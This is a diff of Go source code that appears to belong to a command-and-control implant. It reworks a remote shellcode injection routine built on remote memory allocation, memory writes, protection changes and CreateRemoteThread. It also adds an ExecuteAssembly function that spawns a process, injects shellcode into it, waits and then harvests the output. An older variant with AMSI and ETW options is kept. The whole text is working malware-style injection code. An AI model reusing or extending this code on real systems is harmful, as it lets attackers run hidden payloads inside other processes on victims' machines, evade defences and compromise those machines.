@@ -69,10 +69,11 @@ func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 }
 
 // injectTask - Injects shellcode into a process handle
-func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error {
+func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
 	var (
-		err        error
-		remoteAddr uintptr
+		err          error
+		remoteAddr   uintptr
+		threadHandle windows.Handle
 	)
 	dataSize := len(data)
 	// Remotely allocate memory in the target process
@@ -91,7 +92,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 		// {{if .Debug}}
 		log.Println("[!] failed to allocate remote process memory")
 		// {{end}}
-		return err
+		return threadHandle, err
 	}
 
 	// Write the shellcode into the remotely allocated buffer
@@ -104,7 +105,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 		// {{if .Debug}}
 		log.Printf("[!] failed to write data into remote process")
 		// {{end}}
-		return err
+		return threadHandle, err
 	}
 	if !rwxPages {
 		var oldProtect uint32
@@ -114,7 +115,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 			//{{if .Debug}}
 			log.Println("VirtualProtectEx failed:", err)
 			//{{end}}
-			return err
+			return threadHandle, err
 		}
 	}
 	// Create the remote thread to where we wrote the shellcode
@@ -123,7 +124,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 	// {{end}}
 	attr := new(windows.SecurityAttributes)
 	var lpThreadId uint32
-	_, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
+	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
 	// {{if .Debug}}
 	log.Printf("createremotethread returned:  err = %v", err)
 	// {{end}}
@@ -131,9 +132,9 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error 
 		// {{if .Debug}}
 		log.Printf("[!] failed to create remote thread")
 		// {{end}}
-		return err
+		return threadHandle, err
 	}
-	return nil
+	return threadHandle, nil
 }
 
 // RermoteTask - Injects Task into a processID using remote threads
@@ -146,7 +147,7 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	if processHandle == 0 {
 		return err
 	}
-	err = injectTask(processHandle, data, rwxPages)
+	_, err = injectTask(processHandle, data, rwxPages)
 	if err != nil {
 		return err
 	}
@@ -190,7 +191,41 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
+func ExecuteAssembly(data []byte, process string) (string, error) {
+	var stdoutBuf, stderrBuf bytes.Buffer
+	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Could not start process:", process)
+		//{{end}}
+		return "", err
+	}
+	pid := cmd.Process.Pid
+	// {{if .Debug}}
+	log.Printf("[*] %s started, pid = %d\n", process, pid)
+	// {{end}}
+	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	if err != nil {
+		return "", err
+	}
+	threadHandle, err := injectTask(handle, data, false)
+	if err != nil {
+		return "", err
+	}
+	err = waitForCompletion(threadHandle)
+	if err != nil {
+		return "", err
+	}
+	err = cmd.Process.Kill()
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Kill failed: %s\n", err.Error())
+		// {{end}}
+	}
+	return stdoutBuf.String() + stderrBuf.String(), nil
+}
+
+func ExecuteAssemblyOld(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
 	assemblySizeArr := convertIntToByteArr(len(assembly))
 	paramsSizeArr := convertIntToByteArr(len(params) + 1)
 	err := refresh()
